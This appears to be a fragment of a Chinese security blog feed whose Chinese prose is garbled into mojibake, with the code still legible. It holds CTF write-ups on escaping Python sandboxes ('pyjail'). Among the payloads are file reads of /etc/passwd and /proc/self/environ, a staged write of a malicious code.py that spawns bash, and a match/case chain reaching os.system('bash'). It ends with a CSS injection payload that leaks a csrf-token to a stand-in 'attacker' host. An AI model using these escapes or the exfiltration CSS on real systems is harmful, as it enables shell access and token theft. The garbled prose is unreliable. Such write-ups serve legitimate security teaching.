è½½èµ·æ¥åä½¿ç”¨ xdebug trace æ—¥å¿—è¾…åŠ©åˆ†æä»£ç è¿è¡Œæµç¨‹ã€‚ è®°å½•ä¸€ä¸‹ xcache ç¯å¢ƒçš„æ­å»ºè¿‡ç¨‹ã€‚ wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz tar zxvf xcache-3.2.0.tar.gz cd xcache-3.2.0 phpize ./configure --enable-xcache --enable-xcache-encoder --enable-xcache-decoder --enable-xcache-assembler --enable-xcache-disassembler --with-php-config=/usr/bin/php-config make &amp; make install ä½†æˆ‘æœ¬åœ°ä¸€ç›´æ²¡æœ‰è‡ªåŠ¨ç”Ÿæˆè¯¥ mmap æ–‡ä»¶ï¼Œæ‰‹åŠ¨åˆ›å»ºè¯¥æ–‡ä»¶åæƒé™è®¾å®šä¸º 777ï¼Œé‡å¯åå¯ä»¥ç”Ÿæˆã€‚ MISC pyjail1 é¢˜ç›®æºç å¦‚ä¸‹ï¼š import code, os, subprocess import pty def blacklist_fun_callback(*args): print("Player! It's already banned!") pty.spawn = blacklist_fun_callback os.system = blacklist_fun_callback os.popen = blacklist_fun_callback subprocess.Popen = blacklist_fun_callback subprocess.call = blacklist_fun_callback code.interact = blacklist_fun_callback code.compile_command = blacklist_fun_callback vars = blacklist_fun_callback attr = blacklist_fun_callback dir = blacklist_fun_callback getattr = blacklist_fun_callback exec = blacklist_fun_callback __import__ = blacklist_fun_callback compile = blacklist_fun_callback breakpoint = blacklist_fun_callback del os, subprocess, code, pty, blacklist_fun_callback input_code = input("Can u input your code to escape &gt; ") blacklist_words = [ "subprocess", "os", "code", "interact", "pty", "pdb", "platform", "importlib", "timeit", "imp", "commands", "popen", "load_module", "spawn", "system", "/bin/sh", "/bin/bash", "flag", "eval", "exec", "compile", "input", "vars", "attr", "dir", "getattr" "__import__", "__builtins__", "__getattribute__", "__class__", "__base__", "__subclasses__", "__getitem__", "__self__", "__globals__", "__init__", "__name__", "__dict__", "._module", "builtins", "breakpoint", "import", ] def my_filter(input_code): for x in blacklist_words: if x in input_code: return False return True while '{' in input_code and '}' in input_code and input_code.isascii() and my_filter(input_code) and "eval" not in input_code and len(input_code) &lt; 65: input_code = eval(f"f'{input_code}'") else: print("Player! Please obey the filter rules which I set!") é¢˜ç›®ä¸»è¦è®¾ç½®äº†å‡ ä¸ªé˜²æŠ¤ï¼š å°†ä¸€äº›æ•æ„Ÿå‡½æ•°ä½¿ç”¨ blacklist_fun_callback è¿›è¡Œè¦†ç›–ã€‚ pty.spawn = blacklist_fun_callback os.system = blacklist_fun_callback os.popen = blacklist_fun_callback subprocess.Popen = blacklist_fun_callback subprocess.call = blacklist_fun_callback code.interact = blacklist_fun_callback code.compile_command = blacklist_fun_callback å°†ä¸€äº› builtins ä¸­çš„å‡½æ•°è¿›è¡Œè¦†ç›–ï¼š vars = blacklist_fun_callback attr = blacklist_fun_callback dir = blacklist_fun_callback getattr = blacklist_fun_callback exec = blacklist_fun_callback __import__ = blacklist_fun_callback compile = blacklist_fun_callback breakpoint = blacklist_fun_callback åˆ é™¤äº† os, subprocess, code, pty åº“ã€‚ è®¾ç½®äº†ä¸€ä¸ªé»‘åå• blacklist_wordsï¼Œè¿‡æ»¤äº†ä¸€äº›æ•æ„Ÿçš„å‡½æ•°åï¼Œä½†æ²¡æœ‰è¿‡æ»¤ openã€write ç­‰æ–‡ä»¶æ“ä½œå‡½æ•°ã€‚ï¼ˆhelp ä¹Ÿæ²¡æœ‰è¿‡æ»¤ï¼Œä½†è¿›å…¥æ–‡æ¡£åæ— æ³•è¾“å…¥ :ï¼‰ æ§åˆ¶è¾“å…¥çš„é•¿åº¦ä¸º 65 ä»¥ä¸‹ï¼Œå¹¶ä¸”åªèƒ½è¾“å…¥ ascii å­—ç¬¦ï¼Œunicode å°±ç”¨ä¸äº†äº†ã€‚ æœ€åé€šè¿‡ f string æ¥æ‰§è¡Œä»£ç ã€‚ ç”±äºæ²¡æœ‰è¿‡æ»¤ open å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼š {print(open("/etc/passwd").read())} è¯»å– /proc/self/environ æ—¶å¯ä»¥è¯»å–åˆ° flagã€‚ pyjail2 è§£æ³• 1ï¼šå†™æ–‡ä»¶ pyjail2 çš„æºä»£ç æ²¡æœ‰å˜ï¼Œä½† flag å€¼ä¸åœ¨ /proc/self/environ ä¸­äº†ã€‚ç”±äº write å‡½æ•°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥ä¸€ä¸ª python æ–‡ä»¶ï¼Œç„¶ååŠ è½½è¯¥æ–‡ä»¶æ¥ getshellã€‚ ç”±äºè„šæœ¬æœ¬èº«åŠ è½½äº† code æ¨¡å—ï¼Œæˆ‘ä»¬åœ¨å½“å‰ç›®å½•å†™ä¸€ä¸ª code.pyï¼Œå†æ¬¡è¿è¡Œè¯¥è„šæœ¬æ—¶ï¼Œå°±ä¼šåŠ è½½æˆ‘ä»¬å†™å…¥çš„ code.pyï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥ä¸‹é¢çš„å†…å®¹ï¼Œå°±å¯ä»¥ç›´æ¥è·å– shellã€‚ __import__('os').system("bash") ç”±äºé™åˆ¶äº†è¾“å…¥é•¿åº¦ä¸èƒ½å¤Ÿè¶…è¿‡ 64ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ‡åˆ†å†™å…¥ï¼Œä¾‹å¦‚ï¼š {open("a","w").write("__im")} {open("a","a").write("port_")} æ³¨æ„ï¼Œå½“æˆ‘ä»¬éœ€è¦å†™å…¥å«æœ‰å•å¼•å·çš„å­—ç¬¦æ—¶ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ {open("a","a").write("_('o")} ä¼šå‡ºç°æŠ¥é”™: Traceback (most recent call last): File "&lt;string&gt;", line 1, in &lt;module&gt; File "&lt;string&gt;", line 1 f'{open("a","a").write("s'")}' ^ SyntaxError: unterminated string literal (detected at line 1) è¿™æ˜¯ç”±äºç»è¿‡å¤–å±‚çš„ f string ä¹‹åï¼Œeval æ‰§è¡Œçš„æ˜¯å¦‚ä¸‹çš„å­—ç¬¦ä¸²ï¼Œç”±äºå•å¼•å·æ²¡æœ‰é—­åˆï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œï¼Œä½†æˆ‘ä»¬åŠ å…¥åæ–œæ åï¼Œåˆä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼Œf-string è¡¨è¾¾å¼éƒ¨åˆ†ä¸èƒ½åŒ…å«åæ–œæ ã€‚ f-string expression part cannot include a backslash ä½†å®é™…æˆ‘ä»¬å¯ä»¥ç›´æ¥é—­åˆæ‰ä¸¤å¤´çš„å­—ç¬¦ä¸²ï¼Œé¿å…å—åˆ° f-string çš„é™åˆ¶ï¼š è¾“å…¥ï¼š',open("a","a").write("s'"),' æ‹¼æ¥åä¸ºï¼ševal('f\'\',open("a","a").write("s\'"),\'\'') å°† payload å†™å…¥æ–‡ä»¶ a åï¼Œå¯ä»¥å°†å†…å®¹å†™å…¥ code.pyï¼Œç”±äº code ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡ï¼š {1}',open('cod'+'e.py','w').write(open('a').read()),' å†™å…¥ code.py åï¼Œå†åŠ è½½ä¸€æ¬¡å³å¯è¿›å…¥ bashã€‚ å®Œæ•´ expï¼š {open("a","w").write("__im")} {open("a","a").write("port_")} {1}',open("a","a").write("_('o"),' {1}',open("a","a").write("s').syste"),' {1}',open("a","a").write("m('bash')"),' {1}',open('cod'+'e.py','w').write(open('a').read()),' è§£æ³• 2ï¼šæ¸…ç©º blacklist_words è¯¥åˆ©ç”¨æ‰‹æ³•çš„æ€è·¯å¦‚æœï¼š å°† blacklist_words ç½®ç©ºï¼Œç„¶ååˆ©ç”¨ input() æ¥ç»•è¿‡é•¿åº¦é™åˆ¶è¿›ä¸€æ­¥è¾“å…¥å†…å®¹ã€‚ åˆ©ç”¨ globals()[builtins] è·å–åˆ°å†…ç½®æ¨¡å—ï¼Œä»è€Œè·å–åŸå§‹çš„å†…ç½®å‡½æ•°ã€‚ å…·ä½“å¯å‚è€ƒæ–‡ç« ï¼š2023 å¼ºç½‘æ¯ Writeup - CN-SEC ä¸­æ–‡ç½‘ å…¨å±€å˜é‡ blacklist_words å¯ä»¥é€šè¿‡ globals() è·å–ï¼Œä¸‹é¢çš„ payload å³å¯å°†è¯¥å…¨å±€å˜é‡æ¸…ç©ºï¼š list(globals().values())[-2].clear() æ¸…ç©ºä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨é»‘åå•çš„å‡½æ•°äº†ï¼Œä½†ç”±äºé•¿åº¦é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾— eval æ‰§è¡Œåè¿”å› {input()}ï¼Œä¾‹å¦‚ï¼š {[list(globals().values())[-2].clear(),"(inpu""t())}"][1]} # input_code = eval(f"f'{input_code}'") åå¯ä»¥å¾—åˆ° {input()} ç”±äº while å¾ªç¯çš„å­˜åœ¨ï¼Œä¼šå†æ¬¡è¿›å…¥ evalï¼Œæ‰§è¡Œ eval(â€œfâ€™{input()}â€™â€) ä¼šæ‰“å¼€è¾“å…¥ã€‚ ç”±äº blacklist_fun_callback ä»…ä»…è¦†ç›–çš„æ˜¯å½“å‰å‘½åç©ºé—´ä¸­çš„ breakpoint å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ globals()["__builtins__"] è·å–åˆ°åŸå§‹çš„ builtins å‡½æ•°ã€‚å› æ­¤æˆ‘ä»¬å†ä¼ å…¥ä¸‹é¢çš„ payload å³å¯æ‰“å¼€ breakpoint çš„ Pdb äº¤äº’å¼å‘½ä»¤è¡Œ. {globals()["__builtins__"].breakpoint()} è¿›å…¥å‘½ä»¤è¡Œåï¼Œå¯ä»¥é€šè¿‡ os.listdir æˆ–è€… glob.glob æ–¹æ³•åˆ—ç›®å½•ã€‚ import os os.listdir("/") å¦å¤–ï¼Œos æ¨¡å—é™¤äº† system ä»¥å¤–ï¼Œè¿˜æœ‰åˆ«çš„æ¨¡å—ä¹Ÿæ˜¯å¯ä»¥ getshell çš„ï¼Œæ¯”å¦‚ï¼š os.posix_spawn("/bin/bash", ["/bin/bash"], os.environ) æ–¹æ³•å¤šå¤šï¼Œå…·ä½“å¯å‚è€ƒæˆ‘æ­¤å‰çš„åšå®¢ï¼šCTF Pyjail æ²™ç®±é€ƒé€¸åŸç†åˆé›† pyjail3 è¿™é“é¢˜æ¶‰åŠåˆ°äº† AST ç»•è¿‡ï¼Œä½†é™åˆ¶éå¸¸æ­»ï¼Œæºç å¦‚ä¸‹ï¼š import ast BAD_ATS = { ast.Attribute, ast.Subscript, ast.comprehension, ast.Delete, ast.Try, ast.For, ast.ExceptHandler, ast.With, ast.Import, ast.ImportFrom, ast.Assign, ast.AnnAssign, ast.Constant, ast.ClassDef, ast.AsyncFunctionDef, } BUILTINS = { "bool": bool, "set": set, "tuple": tuple, "round": round, "map": map, "len": len, "bytes": bytes, "dict": dict, "str": str, "all": all, "range": range, "enumerate": enumerate, "int": int, "zip": zip, "filter": filter, "list": list, "max": max, "float": float, "divmod": divmod, "unicode": str, "min": min, "range": range, "sum": sum, "abs": abs, "sorted": sorted, "repr": repr, "object": object, "isinstance": isinstance } def is_safe(code): if type(code) is str and "__" in code: return False for x in ast.walk(compile(code, "&lt;QWB7th&gt;", "exec", flags=ast.PyCF_ONLY_AST)): if type(x) in BAD_ATS: return False return True if __name__ == "__main__": user_input = "" while True: line = input() if line == "": break user_input += line user_input += "\n" if is_safe(user_input) and len(user_input) &lt; 1800: exec(user_input, {"__builtins__": BUILTINS}, {}) BAD_ATS è¿‡æ»¤äº†éå¸¸å¤šçš„ AST ç±»å‹ï¼Œå…¶ä¸­å½±å“æ¯”è¾ƒå¤§çš„æ˜¯ä¸‹é¢çš„è¿™å‡ ä¸ªï¼š ast.Attributeï¼šæœ€ä¸ºè‡´å‘½ï¼Œæ„å‘³ç€ . å·è·å–å±æ€§æ— æ³•ä½¿ç”¨ã€‚ ast.Constantï¼šæ— æ³•ä½¿ç”¨å¸¸é‡ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡½æ•°æ¥è·å–å¸¸é‡ï¼Œä¾‹å¦‚ str(len[[]])=â€™0â€™ ast.Subscriptï¼šæ— æ³•ä½¿ç”¨ç´¢å¼•ã€åˆ‡ç‰‡ç­‰ã€‚ ast.ClassDefï¼šä¸èƒ½å¤Ÿå®šä¹‰ç±»ã€‚ ast.Forï¼šä¸èƒ½ä½¿ç”¨ for å¾ªç¯ BUILTINS ä¸­èƒ½å¤Ÿä½¿ç”¨çš„å‡½æ•°éƒ½ä¸å…·å¤‡ RCE æˆ–è€…æ“ä½œæ–‡ä»¶ç³»ç»Ÿçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ç»•è¿‡ no builtinsã€‚ æ„é€ : [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") ç»•è¿‡ ast.Attribute è·å–å±æ€§ å¦‚ä½•ç»•è¿‡ ast.Attributeï¼Ÿpython 3.10 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç‰¹æ€§ï¼šmatch/caseï¼Œç±»ä¼¼å…¶ä»–è¯­è¨€ä¸­çš„ switch/caseï¼Œä½† match/case æ›´åŠ å¼ºå¤§ï¼Œé™¤äº†å¯ä»¥åŒ¹é…æ•°å­—å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åŒ¹é…å­—å…¸ã€å¯¹è±¡ç­‰ã€‚ æœ€ç®€å•çš„ç¤ºä¾‹ï¼ŒåŒ¹é…å­—ç¬¦ä¸²ï¼š item = 2 match item: case 1: print("One") case 2: print("Two") # Two è¿˜å¯ä»¥åŒ¹é…å¹¶è‡ªåŠ¨èµ‹å€¼ç»™å±€éƒ¨å˜é‡ï¼Œä¼ å…¥ (1,2) æ—¶ï¼Œä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ†æ”¯ï¼Œå¹¶å¯¹ x,y èµ‹å€¼ã€‚ item = (1, 2) match item: case (x, y, z): print(f"{x} {y} {z}") case (x, y): print(f"{x} {y}") case (x,): print(f"{x}") å¯¹äºåŸºæœ¬ç±»å‹çš„åŒ¹é…æ¯”è¾ƒå¥½ç†è§£ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåŒ¹é…ç±»çš„ç¤ºä¾‹ï¼š class AClass: def __init__(self, value): self.thing = value item = AClass(32) match item: case AClass(thing=x): print(f"Got {x = }!") # Got x = 32! åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé‡ç‚¹å…³æ³¨case AClass(thing=x)ï¼Œè¿™é‡Œçš„å«ä¹‰å¹¶éæ˜¯å°† x èµ‹å€¼ç»™ thingï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç†è§£ä¸ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¡¨ç¤ºåŒ¹é…ç±»å‹ä¸º AClass ä¸”å­˜åœ¨ thing å±æ€§çš„å¯¹è±¡ï¼Œå¹¶ä¸” thing å±æ€§å€¼è‡ªåŠ¨èµ‹å€¼ç»™ xã€‚ è¿™æ ·ä¸€æ¥å°±å¯ä»¥åœ¨ä¸é€‚ç”¨ . å·çš„æƒ…å†µä¸‹è·å–åˆ°ç±»çš„å±æ€§å€¼ã€‚ä¾‹å¦‚è·å– ''.__class__ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹çš„ match/case è¯­å¥ï¼š match str(): case str(__class__=x): print(x==''.__class__) # True å¯ä»¥çœ‹åˆ° x å°±æ˜¯ ''.__class__. å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½è¾“å…¥ object ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ object æ¥æ›¿ä»£ strï¼Œè¿™æ ·å°±æ— éœ€å…³æ³¨åŒ¹é…åˆ°çš„åˆ°åº•æ˜¯å“ªä¸ªç±»ã€‚ match str(): case object(__class__=x): print(x==''.__class__) # True å†æµ‹è¯•ä¸€ä¸‹è¯¥ payload çš„ ASTï¼š import os import ast a = ''' match str(): case str(__class__=x): print(x) ''' print(ast.dump(ast.parse(a, mode='exec'), indent=4)) AST å¦‚ä¸‹ï¼š Module( body=[ Match( subject=Call( func=Name(id='str', ctx=Load()), args=[], keywords=[]), cases=[ match_case( pattern=MatchClass( cls=Name(id='str', ctx=Load()), patterns=[], kwd_attrs=[ '__class__'], kwd_patterns=[ MatchAs(name='x')]), body=[ Expr( value=Call( func=Name(id='print', ctx=Load()), args=[ Name(id='x', ctx=Load())], keywords=[]))])])], type_ignores=[]) å¯ä»¥çœ‹åˆ°ç¡®å®æ²¡æœ‰ Attributeï¼Œä¾æ®è¿™ä¸ªåŸç†ï¼Œå°±å¯ä»¥ç»•è¿‡ ast.Attribute æˆ‘ä»¬å¯ä»¥æ„é€ æ›¿ä»£ ''.__class__.__base__.__subclasses__()çš„ payloadï¼š match str(): case object(__class__=clazz): match clazz: case object(__base__=bass): match bass: case object(__subclasses__=subclazz): print(subclazz) ç»•è¿‡ ast.Assign èµ‹å€¼å˜é‡ ast.Assign æ— æ³•ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ = æ¥è¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æµ·è±¡è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚ï¼š [ system:=111, bash:=222 ] æ­¤æ—¶ AST æ ‘å¦‚ä¸‹,æµ·è±¡è¡¨è¾¾å¼ç”¨åˆ°çš„æ˜¯ ast.NamedExpr è€Œé ast.Assign Module( body=[ Expr( value=List( elts=[ NamedExpr( target=Name(id='system', ctx=Store()), value=Constant(value=111)), NamedExpr( target=Name(id='bash', ctx=Store()), value=Constant(value=222))], ctx=Load()))], type_ignores=[]) ç»•è¿‡ ast.Constant è·å–æ•°å­—ã€å­—ç¬¦ä¸² é¢˜ç›®é™åˆ¶äº† ast.Constantï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨æ•°å­—ã€å­—ç¬¦ä¸²å¸¸é‡ï¼Œä½†é€šè¿‡å…¶ä»–çš„å‡½æ•°ç»„åˆæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºæ•°å­—å’Œå­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼š "" : str() 0 : len([]) "0": str(len([])) "1": str(len([str()])) æˆ– str(len([min])) "2": str(len([str(),str()])) æˆ– str(len([min,max])) 'A': chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min])) å¦‚æœè¦ç”¨æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ° chr å‡½æ•°ï¼Œè™½ç„¶é¢˜ç›®çš„ builtins æ²¡æœ‰ç›´æ¥æä¾› chr å‡½æ•°ï¼Œä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ª chrã€‚ å½“ç„¶ï¼Œé¢˜ç›® builtins å…è®¸ dict å’Œ listï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç›´æ¥æ„é€ å‡ºå­—ç¬¦ä¸²ï¼Œè¿™ç§æ–¹å¼åœ¨æˆ‘æ­¤å‰çš„åšå®¢ï¼špyjail bypass-02 ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤ ä¸­æœ‰æåˆ°è¿‡ã€‚ åœ¨è¿™ä¸ª payload ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å‡º _wrap_closeã€systemã€bash [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°è¿™å‡ ä¸ªå­—ç¬¦ä¸²ï¼š list(dict(system=[]))[0] # system list(dict(_wrap_close=[]))[0] # _wrap_close list(dict(bash=[]))[0] # bash ç»•è¿‡ ast.Subscript è·å–åˆ—è¡¨/å­—å…¸å…ƒç´  é¢˜ç›®åŒæ—¶é™å®šäº† ast.Subscriptï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ç´¢å¼•ã€‚ä½† BUILTINS ä¸­ç»™å‡ºäº† min å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è·å–åˆ—è¡¨ä¸­æœ€å°çš„å…ƒç´ ï¼Œå½“åˆ—è¡¨ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å–å€¼ã€‚ min(list(dict(system=[]))) # system min(list(dict(_wrap_close=[]))) # _wrap_close min(list(dict(bash=[]))) # bash å¦‚æœè¦è·å–å­—å…¸å…ƒç´ ï¼Œå¯ä»¥åˆ©ç”¨ get å‡½æ•°æ¥æ›¿ä»£ Subscriptã€‚ä¾‹å¦‚æˆ‘éœ€è¦åœ¨ globals å­—å…¸ä¸­è·å– key ä¸º system çš„å…ƒç´ ï¼Œå¯ä»¥é…åˆ match/case æ¥è·å–ã€‚ match globals: case object(get=get_func): get_func("system") ç»•è¿‡ ast.For éå†åˆ—è¡¨ åœ¨æ„é€ æœ€ç»ˆ payload ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ __subclasses__()å¾—åˆ°çš„åˆ—è¡¨ä¸­è·å–åˆ° _wrap_close ç±»ã€‚ [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") å½“åˆ—è¡¨ä¸­ä¸åªæœ‰ä¸€ä¸ªå…ƒç´ ä¸”åˆ—è¡¨ä¸­çš„å…ƒç´ ä¹‹é—´æ— æ³•æ¯”è¾ƒæ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ for æ¥éå†å¹¶åˆ¤æ–­ï¼Œä½† ast.For è¢«é¢˜ç›®è¿‡æ»¤äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ filterï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š def filter_func(subclazzes_item): [ _wrap_close:=min(list(dict(_wrap_close=[])))] match subclazzes_item: case object(_ï¼¿name_ï¼¿=name): if name==_wrap_close: return subclazzes_item [ subclazzes_item:=min(filter(filter_func,subclazzes())) ] fitler ä¸­ä½¿ç”¨ match/case å’Œ if æ¥è¿›è¡Œè¿‡æ»¤ã€‚ é™¤äº†ä½¿ç”¨ filter å‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ iter å’Œ next å‡½æ•°æ¥éå†åˆ—è¡¨ï¼Œä½†é¢˜ç›® BUILTINS ä¸­æ²¡æœ‰ç»™å‡ºè¿™ä¸¤ä¸ªå‡½æ•°ã€‚ EXP æ•´åˆäº†æ‰€æœ‰çš„ç»•è¿‡æ‰‹æ®µï¼Œå…¶å®å°±å¯ä»¥ç¼–å†™å‡º payload äº†ã€‚ match str(): case object(_ï¼¿class_ï¼¿=clazz): match clazz: case object(_ï¼¿base_ï¼¿=bass): match bass: case object(_ï¼¿subclasses_ï¼¿=subclazzes): [ system:=min(list(dict(system=[]))), bash:=min(list(dict(bash=[]))) ] def filter_func(subclazzes_item): [ _wrap_close:=min(list(dict(_wrap_close=[])))] match subclazzes_item: case object(_ï¼¿name_ï¼¿=name): if name==_wrap_close: return subclazzes_item [ subclazzes_item:=min(filter(filter_func,subclazzes())) ] match subclazzes_item: case object(_ï¼¿init_ï¼¿=initz): match initz: case object(_ï¼¿globals_ï¼¿=globals): match globals: case object(get=get_func): get_func(system)(bash) æ–°å­¦åˆ°çš„ä¸€äº›ç»•è¿‡æ‰‹æ³•ä¹Ÿä¼šåŒæ­¥æ›´æ–°åˆ° pyjail ç³»åˆ—åšå®¢ğŸ˜Šã€‚ å‚è€ƒ ç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh å¼ºç½‘æ¯ 2023 çº¿ä¸Šèµ›éƒ¨åˆ† Writeup - Hurrisonâ€™s Blog 13. Structural Pattern Matching (Python 3.10+) â€” Level Up Your Python]]></summary></entry><entry><title type="html">å‰ç«¯å®‰å…¨ï¼šCSS æ³¨å…¥</title><link href="/css/2023/12/12/CSS-injection.html" rel="alternate" type="text/html" title="å‰ç«¯å®‰å…¨ï¼šCSS æ³¨å…¥" /><published>2023-12-12T18:29:48+08:00</published><updated>2023-12-12T18:29:48+08:00</updated><id>/css/2023/12/12/CSS-injection</id><content type="html" xml:base="/css/2023/12/12/CSS-injection.html"><![CDATA[<h1 id="å‰ç«¯å®‰å…¨css-æ³¨å…¥">å‰ç«¯å®‰å…¨ï¼šCSS æ³¨å…¥</h1>
<p>css æ³¨å…¥é€šå¸¸ç”¨äºçªƒå–é¡µé¢æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ csrf-tokenï¼Œcsp ä¸­çš„ nonce å€¼ç­‰ã€‚é€šå¸¸é…åˆ xssã€csrf æ¼æ´ä¸€åŒä½¿ç”¨ã€‚</p>
<h2 id="css-æ³¨å…¥åŸç†">CSS æ³¨å…¥åŸç†</h2>
<p>ä¸‹é¢çš„ payload å±•ç¤ºäº†ä¸€ä¸ªçªƒå– csrf-token çš„ç¤ºä¾‹ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE html&gt;

&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;style&gt;
        form:has<span class="o">(</span>input[name<span class="o">=</span><span class="s2">"csrf-token"</span><span class="o">][</span>value^<span class="o">=</span><span class="s2">"a"</span><span class="o">]){</span>
            background: url<span class="o">(</span><span class="s2">"http://attacker/?q=a"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
    &lt;/style&gt;
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
&lt;/head&gt;

&lt;body&gt;
    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/action"</span><span class="o">&gt;</span>
        &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"csrf-token"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"abc123"</span><span class="o">&gt;</span>
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>
<p>åœ¨è¿™ä¸ª payload ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ has é€‰æ‹©å™¨ï¼Œä» form è¡¨å•ä¸­é€‰æ‹©æ»¡è¶³ name=â€csrf-tokenâ€ï¼Œvalue ä»¥ a å¼€å¤´çš„ input æ ‡ç­¾ï¼Œå¦‚æœèƒ½å¤Ÿè·å–åˆ°è¿™æ ·çš„æ ‡ç­¾ï¼Œå°±é€šè¿‡ background åŠ è½½è¿œç¨‹å›¾ç‰‡ã€‚</p>

<p>æ¢å¥è¯æ¥è¯´ï¼Œå¦‚æœèƒ½å¤Ÿæ’å…¥è¿™æ ·ä¸€è¡Œ css ä»£ç ï¼Œå¹¶ä¸” csrf-token ç¡®å®ä»¥ a å¼€å¤´ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå—åˆ°ä¸€ä¸ªè¯·æ±‚ã€‚é€šè¿‡éå†å°±å¯ä»¥ç¡®è®¤ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
